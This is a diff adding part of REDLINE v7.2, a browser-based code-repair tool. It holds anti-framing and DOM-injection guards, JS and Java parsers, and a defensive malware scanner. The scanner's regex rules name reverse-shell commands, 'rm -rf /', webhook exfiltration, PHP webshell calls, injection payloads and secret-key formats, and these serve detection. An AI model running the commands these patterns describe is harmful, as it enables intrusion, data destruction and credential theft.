+        <li><b>Advice:</b> never paste real credentials, API keys or private keys anywhere — this tool detects them and blocks copying until they're scrubbed, but the safest secret is one that was never pasted.</li>
+      </ul>
+    </div>
+    <div data-pane="security" hidden>
+      <h3>SECURITY POLICY</h3>
+      <ul>
+        <li><b>Content-Security-Policy:</b> <code>default-src 'none'</code>; scripts limited to self + pinned CDNs (unpkg, jsdelivr); styles/fonts limited to Google Fonts; <code>connect-src / object-src / frame-src / form-action / base-uri: none</code>. Because this is a static file, the policy ships via <code>&lt;meta&gt;</code> — if you host it (e.g. GitHub Pages), also send real CSP headers where possible, including <code>frame-ancestors</code> (header-only).</li>
+        <li><b>No execution of your code — guaranteed by construction.</b> This page contains no <code>eval</code> and no <code>new Function</code>. Your code is only ever <i>parsed</i> (acorn for JS, a hand-built Java grammar, JSON.parse, DOMParser, structural scanners). Parsing does not run code.</li>
+        <li><b>Supply chain:</b> the single third-party script (acorn) is version-pinned across two CDNs with automatic fallback. For production, add Subresource Integrity (<code>integrity="sha384-…"</code>, generated with <code>openssl dgst -sha384 -binary … | openssl base64 -A</code>) — deliberately not shipped without a verified hash.</li>
+        <li><b>Anti-hijacking / anti-cloning / anti-mirroring:</b> standalone and benign local/same-origin embeds pass silently. Unknown cross-origin embeds show a visible, dismissible warning while the app keeps working — the honest design, since client-side detection cannot reliably distinguish your IDE preview from a mirror, and a real cloner strips scripts anyway. A MutationObserver removes any <code>script/iframe/object/embed/link</code> injected into the DOM after load. Oracle tables are <code>Object.freeze</code>d against runtime tampering.</li>
+        <li><b>Injection hardening:</b> every dynamic render passes through an HTML escaper; downloads use a fixed whitelisted filename; the textarea opts out of browser autofill/autocorrect.</li>
+        <li><b>Self-XSS warning:</b> the console warns you never to paste code someone told you to paste — that is a classic social-engineering scam.</li>
+        <li><b>Honest limits:</b> heuristics can false-positive; client-side protection cannot stop a determined scraper of rendered output (there is nothing sensitive here to scrape); meta-CSP is weaker than header CSP. Remedies noted above.</li>
+      </ul>
+    </div>
+    <div data-pane="aup" hidden>
+      <h3>ANTI-MALVERTISING &amp; ACCEPTABLE USE</h3>
+      <ul>
+        <li><b>No ads, ever.</b> No ad scripts, no trackers, no third-party beacons — enforced by CSP. Better Ads Standards are met vacuously: nothing commercial is served.</li>
+        <li><b>No deceptive patterns:</b> no forced downloads, no auto-redirects, no fake buttons, no countdown walls, no notification prompts. Downloads and clipboard writes happen only on your explicit click.</li>
+        <li><b>Paste-time malware screening:</b> input is heuristically screened for common malicious families — cryptominers, eval/decode execution chains, webhook &amp; cookie exfiltration, keyloggers, reverse shells, PHP webshells, obfuscated payloads, DGA-style domains, clickjacking overlays, tabnabbing, SQL/XSS/command-injection payloads, and leaked secrets. Malicious-level results are <b>quarantined</b>: copying stays locked until SANITIZE neutralizes the flagged constructs live (commenting first, removing stubborn lines second — every step re-scanned and logged).</li>
+        <li><b>Acceptable use:</b> this is a repair tool for your own code. You may not use it to develop, harden, or launder malware. Findings are heuristic signals, not legal or forensic verdicts — false positives are possible and every match is shown with its rule and line so you can judge.</li>
+        <li><b>Disclosure:</b> if you embed or mirror this tool, you must preserve this policy panel, the CSP, and the frame banner. Stripping them to silently mirror the tool is a violation.</li>
+      </ul>
+    </div>
+  </div>
+  <div class="dlg-foot"><button id="dlgClose">CLOSE</button></div>
+</dialog>
+
+<script>
+/* ================================================================
+   REDLINE v7.2 — SECURE MASTER BUILD (re-reviewed)
+   Hardening layer runs FIRST, then the repair engine.
+   ================================================================ */
+'use strict';
+
+/* ---------------- HARDENING: frame detection (non-blocking) -------------- */
+(function antiFrame(){
+  try{
+    if(window.top===window.self)return;              /* standalone use — pass silently */
+    /* framed: is the parent provably ours? */
+    let parentHref=null;
+    try{ parentHref=window.parent.location.href; }catch(e){ parentHref=null; }
+    let benign=false;
+    if(parentHref){
+      const p=new URL(parentHref);
+      if(p.protocol==='file:'||location.protocol==='file:')benign=true;   /* local preview */
+      else{
+        const my=(location.origin&&location.origin!=='null')?location.origin:null;
+        if(my&&p.origin===my)benign=true;                                /* same-origin embed */
+      }
+    }
+    if(benign)return;
+    /* cross-origin / opaque embed → visible DISMISSIBLE notice, app keeps working */
+    function arm(){
+      const b=document.createElement('div');
+      b.setAttribute('data-rl-own','1');
+      b.style.cssText='position:fixed;top:0;left:0;right:0;z-index:10000;background:#8F2510;color:#F5EFE3;'+
+        'font:600 11px/1.5 ui-monospace,Menlo,monospace;letter-spacing:.08em;padding:9px 14px;'+
+        'display:flex;gap:14px;align-items:center;justify-content:center;text-align:center;flex-wrap:wrap';
+      b.innerHTML='<span>⚠ EMBEDDED VIEW — this tool is running inside a frame or mirror. '+
+        'The original standalone file enforces CSP &amp; never uploads your code; verify you trust this embedding.</span>'+
+        '<button id="rlDismiss" style="flex:none;background:#F5EFE3;color:#8F2510;border:0;font:700 10px ui-monospace,monospace;'+
+        'letter-spacing:.14em;padding:6px 12px;cursor:pointer;border-radius:2px">CONTINUE ANYWAY</button>';
+      document.body.appendChild(b);
+      document.getElementById('rlDismiss').addEventListener('click',()=>b.remove());
+    }
+    if(document.body)arm(); else document.addEventListener('DOMContentLoaded',arm,{once:true});
+  }catch(e){}
+})();
+
+/* ---------------- HARDENING: DOM injection monitor ---------------- */
+(function injectionGuard(){
+  const BAD=/^(SCRIPT|IFRAME|OBJECT|EMBED|LINK|META)$/;
+  const mo=new MutationObserver(muts=>{
+    for(const m of muts){
+      for(const n of m.addedNodes){
+        if(n.nodeType===1 && BAD.test(n.tagName) && !n.hasAttribute('data-rl-own')){
+          try{n.remove();}catch(e){}
+          try{toast('INJECTION BLOCKED — <'+n.tagName.toLowerCase()+'> removed',false);}catch(e){}
+        }
+      }
+    }
+  });
+  function arm(){ try{ mo.observe(document.documentElement,{childList:true,subtree:true}); }catch(e){} }
+  if(document.documentElement) arm(); else document.addEventListener('readystatechange',arm,{once:true});
+})();
+
+/* ---------------- HARDENING: clean URL / anti self-XSS console warn ------ */
+(function hardenMisc(){
+  try{ if(history.replaceState && location.search) history.replaceState(null,'',location.pathname); }catch(e){}
+  try{
+    console.log('%c⚠ REDLINE SECURITY NOTICE','font-size:18px;font-weight:bold;color:#C0331B');
+    console.log('%cNever paste code here (or anywhere) that someone TOLD you to paste — that is a "self-XSS" scam.','color:#8F2510');
+    console.log('%cThis tool parses code; it never executes it. Still: never paste passwords, API keys or private keys.','color:#8F2510');
+  }catch(e){}
+})();
+
+/* ================================================================ */
+const $=id=>document.getElementById(id);
+const esc=s=>String(s).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+const trimMid=(s,n=46)=>{s=String(s).replace(/\s+$/,'').replace(/^\s+/,'');return s.length>n?s.slice(0,n/2-1)+' … '+s.slice(-(n/2-1)):s;};
+const lineOf=(code,idx)=>code.slice(0,idx).split('\n').length;
+
+const state={override:'auto',view:'diff',lastCode:null,lastSrc:null,lastLang:null,stage:null,diagOk:false,diagLines:[],sec:null};
+const STEP_MS=260;
+
+/* ---------------- shared helpers ---------------- */
+function preFixOne(code){
+  if(/^\s*#!/.test(code)) return {code:code.replace(/^\s*#![^\n]*\n?/,''),repair:{rule:'SHEBANG LINE',line:1,before:'#!…',after:'(removed)'}};
+  const f=stripFences(code); if(f) return {code:f.code,repair:{rule:'MARKDOWN FENCE',line:f.line,before:'```…',after:'(removed)'}};
+  const l=stripLangTag(code); if(l) return {code:l,repair:{rule:'LANGUAGE TAG',line:1,before:'lang',after:'(removed)'}};
+  if(/[“”‘’]/.test(code)){ const n=(code.match(/[“”‘’]/g)||[]).length; const fl=lineOf(code,code.search(/[“”‘’]/));
+    return {code:code.replace(/[“”]/g,'"').replace(/[‘’]/g,"'"),repair:{rule:'SMART QUOTES → STRAIGHT ×'+n,line:fl,before:'“ ” ‘ ’',after:'" \''}};}
+  return null;
+}
+function stripFences(code){
+  const lines=code.split('\n'); let changed=false,line=0;
+  if(/^\s*```/.test(lines[0])){ lines.shift(); changed=true; line=1; }
+  const last=lines[lines.length-1];
+  if(/^\s*```\s*$/.test(last)){ lines.pop(); changed=true; line=line||lines.length; }
+  return changed?{code:lines.join('\n'),line:line||1}:null;
+}
+function stripLangTag(code){
+  const lines=code.split('\n');
+  if(lines.length>1&&/^\s{0,8}(?:javascript|typescript|java|python|py|js|ts|json|css|html|xml)\s*$/i.test(lines[0])){ lines.shift(); return lines.join('\n'); }
+  return null;
+}
+function strMask(s,quotes){
+  const m=new Uint8Array(s.length); let q=null;
+  for(let i=0;i<s.length;i++){ const c=s[i];
+    if(q){ m[i]=1; if(c==='\\'){ if(i+1<s.length)m[i+1]=1; i++; } else if(c===q)q=null; }
+    else if(quotes.includes(c)){ q=c; m[i]=1; } }
+  return m;
+}
+function surplusOf(s,open,close){
+  let q=null,d=0;
+  for(let i=0;i<s.length;i++){ const c=s[i];
+    if(q){ if(c==='\\'){i++;} else if(c===q)q=null; continue; }
+    if(c==='"'||c==="'"){ q=c; continue; }
+    if(c===open)d++; else if(c===close)d--; }
+  return d;
+}
+function idxToPos(code,idx){
+  const lines=code.split('\n'); let li=0,c=idx;
+  while(li<lines.length&&c>lines[li].length){ c-=lines[li].length+1; li++; }
+  return {line:li,col:c};
+}
+
+/* ================================================================
+   SECURITY SCANNER (SEC) — v7.2: newline-exact stripping so finding
+   line numbers always map to the raw paste; '//' after ':' (protocol)
+   is NOT a comment; '#' comments only at line start (CSS-safe).
+   ================================================================ */
+function secPrep(code){
+  let out='',i=0,q=null,lc=false,bc=false,hc=false,content=false;
+  const n=code.length;
+  while(i<n){
+    const c=code[i],d=code[i+1]||'';
+    if(c==='\n'){ lc=false; content=false; out+=c; i++; continue; }
+    if(lc){ i++; continue; }
+    if(bc){ if(c==='*'&&d==='/'){bc=false;i+=2;out+=' ';continue;} i+=1; continue; }
+    if(hc){ if(c==='-'&&d==='-'&&code[i+2]==='>'){hc=false;i+=3;out+='   ';continue;} i+=1; continue; }
+    if(q){ out+=c; if(c==='\\'){ out+=d||''; i+=2; continue; } if(c===q)q=null; else if(!/\s/.test(c))content=true; i++; continue; }
+    if(c==='"'||c==="'"||c==='`'){ q=c; out+=c; content=true; i++; continue; }
+    if(c==='/'&&d==='/'&&code[i-1]!==':'){ lc=true; i+=2; continue; }
+    if(c==='/'&&d==='*'){ bc=true; i+=2; continue; }
+    if(c==='<'&&d==='!'&&code[i+2]==='-'&&code[i+3]==='-'){ hc=true; i+=4; continue; }
+    if(c==='#'&&!content){ lc=true; i+=1; continue; }
+    if(!/\s/.test(c))content=true;
+    out+=c; i++;
+  }
+  return out;
+}
+function secRules(){
+  return [
+    {id:'SECRET_AWS',     w:55, cat:'secret', re:/AKIA[0-9A-Z]{16}/g,                         msg:'AWS access-key ID'},
+    {id:'SECRET_GOOGLE',  w:50, cat:'secret', re:/AIza[0-9A-Za-z_\-]{35}/g,                   msg:'Google API key'},
+    {id:'SECRET_STRIPE',  w:50, cat:'secret', re:/(?:sk|rk)_live_[0-9a-zA-Z]{10,}/g,          msg:'Stripe live secret key'},
+    {id:'SECRET_SLACK',   w:50, cat:'secret', re:/xox[abprs]-[0-9A-Za-z\-]{10,}/g,            msg:'Slack token'},
+    {id:'SECRET_JWT',     w:30, cat:'secret', re:/eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{5,}/g, msg:'JWT token'},
+    {id:'SECRET_PRIVKEY', w:70, cat:'secret', re:/-----BEGIN [A-Z ]*PRIVATE KEY-----/g,       msg:'private key block'},
+    {id:'SECRET_GENERIC', w:25, cat:'secret', re:/(?:password|passwd|pwd|api[_-]?key|secret|auth[_-]?token)["'\s:=]{1,5}["'][^"'\n\r]{6,}["']/gi, msg:'hard-coded credential'},
+    {id:'MINER',          w:75, cat:'threat', re:/coinhive|cryptonight|deepMiner|minero\.js|stratum\+tcp|pool\.minexmr/i, msg:'cryptocurrency miner signature'},
+    {id:'EXFIL_WEBHOOK',  w:75, cat:'threat', re:/discord(?:app)?\.com\/api\/webhooks|hooks\.slack\.com\/services\//i, msg:'webhook exfiltration endpoint'},
+    {id:'EXEC_EVAL',      w:30, cat:'threat', re:/\beval\s*\(/g,                              msg:'eval() — dynamic code execution'},
+    {id:'EXEC_FUNC',      w:25, cat:'threat', re:/new\s+Function\s*\(/g,                      msg:'new Function() — dynamic code execution'},
+    {id:'EXFIL_IMG',      w:45, cat:'threat', re:/new\s+Image\s*\([^)]*\)[\s\S]{0,60}?\.src\s*=/g, msg:'image-beacon exfiltration'},
+    {id:'KEYLOG',         w:30, cat:'threat', re:/addEventListener\s*\(\s*['"`]key(?:down|press|up)/g, msg:'global keyboard listener — potential keylogger'},
+    {id:'REV_SHELL',      w:85, cat:'threat', re:/bash\s+-i\s*>&\s*\/dev\/tcp|nc\s+-e\s+\/bin\/(?:ba)?sh|pty\.spawn/gi, msg:'reverse-shell pattern'},
+    {id:'DESTRUCTIVE',    w:55, cat:'threat', re:/rm\s+-rf\s+\/(?:\s|$)/g,                    msg:'destructive filesystem command'},
+    {id:'PHP_SHELL',      w:70, cat:'threat', re:/\b(?:shell_exec|passthru)\s*\(|\bsystem\s*\(\s*\$|eval\s*\(\s*(?:base64_decode|gzinflate|gzuncompress|str_rot13)/g, msg:'PHP webshell pattern'},
+    {id:'SQLI',           w:15, cat:'payload',re:/union[\s\S]{0,20}select|'\s*or\s*'?[^\s']*'\s*=\s*'|xp_cmdshell|;\s*drop\s+table/i, msg:'SQL-injection payload pattern'},
+    {id:'XSS_VEC',        w:12, cat:'payload',re:/<script\b|on(?:error|load|mouseover)\s*=\s*|javascript\s*:/gi, msg:'XSS payload pattern'},
+    {id:'CMD_INJ',        w:20, cat:'payload',re:/;\s*(?:rm|wget|curl|nc)\s|&&\s*(?:rm|wget|curl)\s|\$\((?:cat|whoami)/g, msg:'command-injection pattern'},
+    {id:'TRAVSAL',        w:10, cat:'payload',re:/\.\.\/\.\.\/(?:etc\/passwd|windows)|%2e%2e%2f/gi, msg:'path-traversal pattern'},
+    {id:'HID_IFRAME',     w:60, cat:'threat', re:/<iframe\b[^>]*>/gi,                         msg:'hidden iframe (0×0 / display:none)', inspect:'iframe'},
+    {id:'SRCDOC',         w:25, cat:'threat', re:/srcdoc\s*=/g,                               msg:'iframe srcdoc injection'},
+    {id:'META_REFRESH',   w:15, cat:'threat', re:/<meta[^>]{0,200}http-equiv=["']?refresh[^>]{0,200}url=/i, msg:'meta-refresh redirect (cloaking?)'},
+    {id:'POPUNDER',       w:10, cat:'threat', re:/window\.open\s*\(/g,                        msg:'window.open — popunder potential'},
+    {id:'DGA_DOMAIN',     w:40, cat:'threat', re:/\b[a-z0-9]{14,}\.(?:tk|ml|ga|cf|gq|xyz|top|club)\b/i, msg:'algorithmic-looking domain'},
+    {id:'OBF_HEX',        w:45, cat:'threat', re:/(?:\\x[0-9a-fA-F]{2}){8,}/g,                msg:'hex-escaped blob — obfuscation'},
+    {id:'OBF_B64',        w:30, cat:'threat', re:/[A-Za-z0-9+\/]{140,}={0,2}/g,               msg:'very long base64 blob — obfuscation'},
+    {id:'CLICKJACK',      w:25, cat:'threat', re:/opacity\s*:\s*0(?:\.0+)?\s*[;}"']|visibility\s*:\s*hidden[\s\S]{0,60}?z-index\s*:\s*\d{3,}/i, msg:'invisible overlay — clickjacking pattern'},
+    {id:'TABNAB',         w:30, cat:'threat', re:/window\.opener\b/g,                         msg:'window.opener access — tabnabbing vector'},
+    {id:'CLOAK',          w:15, cat:'threat', re:/font-size\s*:\s*0\b|text-indent\s*:\s*-\d{3,}|color\s*:\s*transparent/i, msg:'hidden text — cloaking pattern'},
+    {id:'DOMAIN_OVERRIDE',w:35, cat:'threat', re:/document\.domain\s*=/g,                     msg:'document.domain override'},
+    {id:'ATOB',           w:20, cat:'threat', re:/\batob\s*\(|\bunescape\s*\(/g,              msg:'runtime string decoder'},
+  ];
+}
+function secScan(raw){
+  const code=secPrep(raw);
+  const findings=[]; let score=0,hasSecret=false;
+  for(const R of secRules()){
+    R.re.lastIndex=0;
+    let m,hits=0;
+    while((m=R.re.exec(code))&&hits<3){
+      hits++;
+      if(R.inspect==='iframe'){
+        const tag=m[0];
+        if(!/(width\s*=\s*["']?0\b|height\s*=\s*["']?0\b|display\s*:\s*none|visibility\s*:\s*hidden)/i.test(tag))continue;
+      }
+      const line=lineOf(code,m.index);
+      const snippet=raw.split('\n')[line-1]||'';
+      if(!findings.find(f=>f.id===R.id&&f.line===line)){
+        findings.push({id:R.id,w:R.w,cat:R.cat,msg:R.msg,line,snippet:trimMid(snippet,60)});
+        score+=R.w; if(R.cat==='secret')hasSecret=true;
+      }
+      if(R.re.lastIndex===m.index)R.re.lastIndex++;
+    }
+  }
+  const exRe=/\b(?:eval|new\s+Function|document\.write)\s*\(/g; let em;
+  while((em=exRe.exec(code))){
+    const back=code.slice(Math.max(0,em.index-140),em.index);
+    const fwd=code.slice(em.index,em.index+140);
+    if(/atob|unescape|fromCharCode|\\x[0-9a-f]{2}|decodeURIComponent/i.test(back+fwd)){
+      const line=lineOf(code,em.index);
+      if(!findings.find(f=>f.id==='OBF_EXEC'&&f.line===line)){
+        const snippet=raw.split('\n')[line-1]||'';
+        findings.push({id:'OBF_EXEC',w:65,cat:'threat',msg:'decode → execute chain (eval/atob)',line,snippet:trimMid(snippet,60)});
+        score+=65;
+      }
+    }
+  }
+  if((code.match(/String\.fromCharCode/g)||[]).length>=3){
+    findings.push({id:'FROMCHARC',w:40,cat:'threat',msg:'repeated String.fromCharCode — obfuscation',line:lineOf(code,code.indexOf('String.fromCharCode')),snippet:''});
+    score+=40;
+  }
+  score=Math.min(score,100);
+  const level=score>=60?'MALICIOUS':(score>=18?'SUSPICIOUS':'CLEAN');
+  return {findings,score,level,hasSecret};
+}
+/* v7.2 — escalation ladder: comment → stubborn line REMOVED → converge.
+   Guaranteed to finish: removal always shrinks the scan surface. */
+function secHitOne(code,lang){
+  const scan=secScan(code);
+  const hasSecret=scan.hasSecret||scan.findings.some(f=>f.cat==='secret');
+  if(scan.level!=='MALICIOUS'&&!hasSecret)return {halt:true,clean:true};
+  const lines=code.split('\n');
+  const cand=scan.findings.slice().sort((a,b)=>(b.w-a.w)||(a.line-b.line));
+  let f=null;
+  for(const c of cand){ const li=c.line-1; if(li>=0&&li<lines.length&&lines[li].trim()){ f=c; break; } }
+  if(!f)return {halt:true,clean:false};
+  const li=f.line-1;
+  const rawLine=lines[li];
+  const q=rawLine.trimStart();
+  if(lang==='html'||lang==='xml'||lang==='json'){
+    if(q.startsWith('[REDACTED:')){
+      lines[li]='';
+      return {code:lines.join('\n'),repair:{rule:'SANITIZE — '+f.id+' (placeholder still flagged — line wiped)',line:f.line,before:trimMid(rawLine),after:'(empty)'}};
+    }
+    const nl='[REDACTED:'+f.id+' w'+f.w+']';
+    lines[li]=nl;
+    return {code:lines.join('\n'),repair:{rule:'SANITIZE — '+f.id+' ('+f.msg+')',line:f.line,before:trimMid(rawLine),after:nl}};
+  }
+  const com=(lang==='python')?'# ':'// ';
+  /* escalation: line already commented (string-state poison / multi-line
+     match) and STILL flagged → remove it outright. Always converges. */
+  if(q.startsWith(com.trim())||q.startsWith('//')||q.startsWith('#')||q.startsWith('/*')||q.startsWith('<!--')||q.startsWith('*')){
+    lines.splice(li,1);
+    return {code:lines.join('\n'),repair:{rule:'SANITIZE — '+f.id+' (stubborn — LINE REMOVED)',line:f.line,before:trimMid(rawLine),after:'(line removed)'}};
+  }
+  const nl=com+'SEC-QUARANTINE: '+rawLine;
+  lines[li]=nl;
+  return {code:lines.join('\n'),repair:{rule:'SANITIZE — '+f.id+' ('+f.msg+')',line:f.line,before:trimMid(rawLine),after:'(commented out)'}};
+}
+function quickScore(code){ const s=secScan(code); return {level:s.level,score:s.score,hasSecret:s.hasSecret}; }
+
+/* ================================================================
+   ORACLES — real parsers (NO eval / NO new Function anywhere)
+   ================================================================ */
+function parseJS(code){
+  if(typeof acorn==='undefined') return {ok:false,message:'acorn unavailable — cannot verify JS',line:null,col:null,nooracle:true};
+  const base={ecmaVersion:'latest',allowReturnOutsideFunction:true,allowAwaitOutsideFunction:true};
+  const mod=/^\s*(import\s|import\{|export\s|export\{)/m.test(code);
+  try{ acorn.parse(code,Object.assign(base,{sourceType:mod?'module':'script'})); return {ok:true}; }
+  catch(e){
+    if(!e||!/SyntaxError/i.test(e.name||'SyntaxError')) return {ok:true};
+    let line=null,col=null;
+    const mm=(e.message||'').match(/\((\d+):(\d+)\)\s*$/);
+    if(mm){ line=+mm[1]; col=+mm[2]; }
+    return {ok:false,message:(e.message||'syntax error').replace(/\s*\(\d+:\d+\)\s*$/,''),line,col};
+  }
+}
+function jsScan(code){
+  const stack=[]; let str=null,escp=false,lc=false,bc=false,line=1;
+  for(let i=0;i<code.length;i++){
+    const c=code[i],d=code[i+1]||'';
+    if(lc){ if(c==='\n'){lc=false;line++;} continue; }
+    if(bc){ if(c==='\n')line++; if(c==='*'&&d==='/'){bc=false;i++;} continue; }
+    if(str){ if(escp)escp=false; else if(c==='\\')escp=true; else if(c===str)str=null; continue; }
+    if(c==='/'&&d==='/'){lc=true;i++;continue;}
+    if(c==='/'&&d==='*'){bc=true;i++;continue;}
+    if(c==='"'||c==="'"||c==='`'){str=c;continue;}
+    if(c==='\n'){line++;continue;}
+    if(c==='('||c==='['||c==='{'){stack.push({c,line});continue;}
+    if(c===')'||c===']'||c==='}'){
+      const t=stack.pop();
+      const ok=t&&((t.c==='('&&c===')')||(t.c==='['&&c===']')||(t.c==='{'&&c==='}'));
+      if(!ok)return{extra:{ch:c,index:i,line},stack};
+    }
+  }
+  return {extra:null,stack,strEnd:str};
+}
+
+/* ---------------- JAVA oracle ---------------- */
+const JAVA_KW=new Set(['abstract','assert','boolean','break','byte','case','catch','char','class','continue','default','do','double','else','enum','extends','final','finally','float','for','goto','if','implements','import','instanceof','int','interface','long','native','new','package','private','protected','public','return','short','static','strictfp','super','switch','synchronized','this','throw','throws','transient','try','void','volatile','while','true','false','null']);
+const JAVA_MOD=new Set(['public','private','protected','static','final','abstract','native','synchronized','transient','volatile','strictfp','default']);
+const JAVA_PRIM=new Set(['byte','short','int','long','char','float','double','boolean','void']);
+const OP1=new Set('+ - * / % = < > & | ^ ! ~ ? : ; , . ( ) [ ] { } @'.split(' '));
+const OPS3=['>>>','<<=','>>='];
+const OPS2=['>>','<<','<=','>=','==','!=','&&','||','++','--','+=','-=','*=','/=','%=','&=','|=','^=','->','::'];
+function lexJava(code){
+  const toks=[]; const n=code.length; let i=0,line=1,ls=0;
+  const push=(t,kind,st,en)=>toks.push({t,kind,line,col:st-ls,ix:st,len:en-st});
+  while(i<n){
+    const c=code[i];
+    if(c==='\n'){ i++; line++; ls=i; continue; }
+    if(c===' '||c==='\t'||c==='\r'){ i++; continue; }
+    if(c==='/'&&code[i+1]==='/'){ while(i<n&&code[i]!=='\n')i++; continue; }
+    if(c==='/'&&code[i+1]==='*'){ i+=2; let cl=false;
+      while(i<n){ const ch=code[i]; if(ch==='\n'){line++;i++;ls=i;continue;} if(ch==='*'&&code[i+1]==='/'){cl=true;i+=2;break;} i++; }
+      if(!cl)throw{lex:1,msg:'unterminated comment',line,col:i-ls};
+      continue; }
+    if(c==='"'&&code[i+1]==='"'&&code[i+2]==='"'){
+      const st=i,sl=line; i+=3; let cl=false;
+      while(i<n){ if(code[i]==='\n'){line++;i++;ls=i;continue;} if(code[i]==='"'&&code[i+1]==='"'&&code[i+2]==='"'){cl=true;i+=3;break;} i++; }
+      if(!cl)throw{lex:1,msg:'unterminated text block',line:sl,col:st-ls};
+      push('<textblock>','str',st,i); continue; }
+    if(c==='"'){
+      const st=i,sl=line; i++; let cl=false;
+      while(i<n){ const d=code[i]; if(d==='\\'){i+=2;continue;} if(d==='\n')break; if(d==='"'){cl=true;i++;break;} i++; }
+      if(!cl)throw{lex:1,msg:'unterminated string literal',line:sl,col:st-ls};
+      push('<str>','str',st,i); continue; }
+    if(c==="'"){
+      const st=i,sl=line; i++; let cl=false;
+      while(i<n){ const d=code[i]; if(d==='\\'){i+=2;continue;} if(d==='\n')break; if(d==="'"){cl=true;i++;break;} i++; }
+      if(!cl)throw{lex:1,msg:'unterminated char literal',line:sl,col:st-ls};
+      push('<char>','chr',st,i); continue; }
+    if(/[0-9]/.test(c)){
+      const st=i;
+      if(c==='0'&&(code[i+1]==='x'||code[i+1]==='X')){ i+=2; while(i<n&&/[0-9a-fA-F_]/.test(code[i]))i++; }
+      else if(c==='0'&&(code[i+1]==='b'||code[i+1]==='B')){ i+=2; while(i<n&&/[01_]/.test(code[i]))i++; }
+      else{
+        while(i<n&&/[0-9_]/.test(code[i]))i++;
+        if(code[i]==='.'&&/[0-9]/.test(code[i+1]||'')){ i++; while(i<n&&/[0-9_]/.test(code[i]))i++; }
+        if(code[i]==='e'||code[i]==='E'){ i++; if(code[i]==='+'||code[i]==='-')i++; while(i<n&&/[0-9_]/.test(code[i]))i++; }
+      }
+      if(/[fFdDlL]/.test(code[i]||''))i++;
+      push(code.slice(st,i),'num',st,i); continue; }
+    if(/[A-Za-z_$]/.test(c)){
+      const st=i; i++;
+      while(i<n&&/[A-Za-z0-9_$]/.test(code[i]))i++;
+      const w=code.slice(st,i);
+      push(w,JAVA_KW.has(w)?'kw':'id',st,i); continue; }
+    const s4=code.substr(i,4),s3=code.substr(i,3),s2=code.substr(i,2);
+    let op=null;
+    if(s4==='>>>=')op=s4; else if(OPS3.includes(s3))op=s3; else if(OPS2.includes(s2))op=s2; else if(OP1.has(c))op=c;
+    if(op){ push(op,'op',i,i+op.length); i+=op.length; continue; }
+    throw{lex:1,msg:'stray character "'+c+'"',line,col:i-ls};
+  }
+  push('<eof>','eof',n,0);
+  return toks;
+}
+function parseJava(code){
+  let toks;
+  try{ toks=lexJava(code); }catch(e){ return {ok:false,msg:e.msg,line:e.line,col:e.col}; }
+  let i=0;
+  const tk=(k=0)=>toks[Math.min(i+(k||0),toks.length-1)];
+  const at=t=>tk().t===t;
+  const kind=k=>tk().kind===k;
+  const atKw=w=>kind('kw')&&tk().t===w;
+  const nx=()=>toks[i++];
+  const err=(m,t)=>{ throw{p:1,msg:m,line:t.line,col:t.col}; };
+  const expect=t=>{ if(at(t)){nx();return;} err("'"+t+"' expected",tk()); };
+  const expectId=w=>{ if(kind('id'))return nx().t; err('<'+(w||'identifier')+' expected>',tk()); };
+  function skipBalanced(o,c){ let d=0;
+    for(;;){ if(kind('eof'))err("unbalanced '"+o+"'",tk()); const t=tk().t; nx(); if(t===o)d++; else if(t===c){d--; if(!d)return;} } }
+  function closeAngle(){
+    const t=tk();
+    if(t.t==='>'){ nx(); return; }
+    if(t.t==='>>'||t.t==='>>>'||t.t==='>>='||t.t==='>>>='||t.t==='>='){
+      const rest=t.t.slice(1); t.t='>'; t.len=1;
+      if(rest)toks.splice(i+1,0,{t:rest,kind:'op',line:t.line,col:t.col+1,ix:t.ix+1,len:rest.length});
+      nx(); return; }
+    err("'>' expected",t);
+  }
+  function typeArgs(){
+    if(at('>')){ closeAngle(); return; }
+    for(;;){
+      if(at('?')){ nx(); if(atKw('extends')||atKw('super')){ nx(); parseType(); } }
+      else parseType();
+      if(at(',')){ nx(); continue; }
+      break;
+    }
+    closeAngle();
+  }
+  function parseType(){
+    while(at('@')){ nx(); expectId('annotation type'); if(at('('))skipBalanced('(',')'); }
+    if(kind('kw')&&JAVA_PRIM.has(tk().t))nx();
+    else{
+      expectId('type');
+      while(at('<')){ nx(); typeArgs(); }
+      while(at('.')&&tk(1).kind==='id'){ nx(); nx(); while(at('<')){ nx(); typeArgs(); } }
+    }
+    while(at('[')&&tk(1).t===']'){ nx(); nx(); while(at('@')){ nx(); expectId(); if(at('('))skipBalanced('(',')'); } }
+  }
+  function mods(){
+    for(;;){
+      if(at('@')){ nx(); expectId('annotation type'); if(at('('))skipBalanced('(',')'); continue; }
+      if(kind('kw')&&JAVA_MOD.has(tk().t)){ nx(); continue; }
+      break;
+    }
+  }
+  function typeParams(){
+    if(!at('<'))return; nx();
+    do{ expectId('type parameter');
+        if(at('<')){ nx(); typeArgs(); }
+        if(atKw('extends')){ nx(); parseType(); }
+    }while(at(',')&&(nx(),true));
+    closeAngle();
+  }
+  function params(){
+    expect('(');
+    while(!at(')')){
+      if(kind('eof'))err("')' expected",tk());
+      mods(); parseType();
+      if(at('.')&&tk(1).t==='.'&&tk(2).t==='.'){ nx(); nx(); nx(); }
+      expectId('parameter name');
+      while(at('[')&&tk(1).t===']'){ nx(); nx(); }
+      if(!at(')'))expect(',');
+    }
+    expect(')');
+  }
+  function throwsOpt(){ if(atKw('throws')){ nx(); do{ parseType(); }while(at(',')&&(nx(),true)); } }
+  function bodyOrSemi(){ if(at('{'))block(); else expect(';'); }
+  function cu(){
+    if(atKw('package')){ nx(); do{ expectId(); }while(at('.')&&(nx(),true)); expect(';'); }
+    while(atKw('import')){ nx(); if(atKw('static'))nx();
+      do{ expectId(); }while(at('.')&&(nx(),true));
+      if(at('.')&&tk(1).t==='*'){ nx(); nx(); }
+      expect(';'); }
+    while(!kind('eof'))typeDecl();
+  }
+  function typeDecl(){
+    mods(); let kw=null;
+    if(at('@')&&tk(1).t==='interface'){ nx(); nx(); kw='interface'; }
+    else if(atKw('class')||atKw('interface')||atKw('enum'))kw=nx().t;
+    else err("'class', 'interface', or 'enum' expected",tk());
+    expectId('type name');
+    if(kw!=='enum')typeParams();
+    if(atKw('extends')){ nx(); parseType(); if(kw==='interface'){ while(at(',')&&(nx(),parseType(),true)); } }
+    if(atKw('implements')){ nx(); do{ parseType(); }while(at(',')&&(nx(),true)); }
+    if(kind('id')&&tk().t==='permits'){ nx(); do{ parseType(); }while(at(',')&&(nx(),true)); }
